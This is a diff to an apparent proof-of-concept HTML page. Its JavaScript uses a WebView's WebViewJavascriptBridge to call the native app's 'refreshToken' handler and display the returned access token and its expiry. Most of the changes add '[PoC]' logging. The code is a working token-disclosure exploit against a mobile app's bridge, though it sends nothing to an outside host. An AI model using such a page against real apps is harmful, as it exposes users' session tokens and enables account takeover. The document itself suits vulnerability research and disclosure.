@@ -4,15 +4,24 @@
     <pre id="result">Waiting for token...</pre>
 
     <script>
-      document.getElementById("result").innerText += "\nJS executed!";
+      const resultBox = document.getElementById("result");
+      resultBox.innerText += "\nJS executed!";
+
+      function log(msg) {
+        console.log("[PoC] " + msg);
+        resultBox.innerText += "\n" + msg;
+      }
 
       function setupBridge(callback) {
         if (window.WebViewJavascriptBridge) {
-          return callback(WebViewJavascriptBridge);
+          log("Bridge already available.");
+          return callback(window.WebViewJavascriptBridge);
         }
         if (window.WVJBCallbacks) {
+          log("Bridge pending (callbacks exist).");
           return window.WVJBCallbacks.push(callback);
         }
+        log("Bridge setup initiated.");
         window.WVJBCallbacks = [callback];
         var WVJBIframe = document.createElement('iframe');
         WVJBIframe.style.display = 'none';
@@ -24,18 +33,22 @@
       }
 
       setupBridge(function (bridge) {
+        log("Bridge connected. Calling 'refreshToken'...");
         bridge.callHandler("refreshToken", "", function (resp) {
+          log("Received response from native side:");
           let output = "";
 
           try {
             const json = JSON.parse(resp);
             output += "Access Token:\n" + json.token + "\n\n";
             output += "Expires In: " + json.expiresIn;
+            log("Token parsed successfully.");
           } catch (e) {
             output = "Error parsing response:\n" + resp;
+            log("Failed to parse JSON.");
           }
 
-          document.getElementById("result").innerText = "JS executed!\n\n" + output;
+          resultBox.innerText += "\n\n" + output;
         });
       });
     </script>
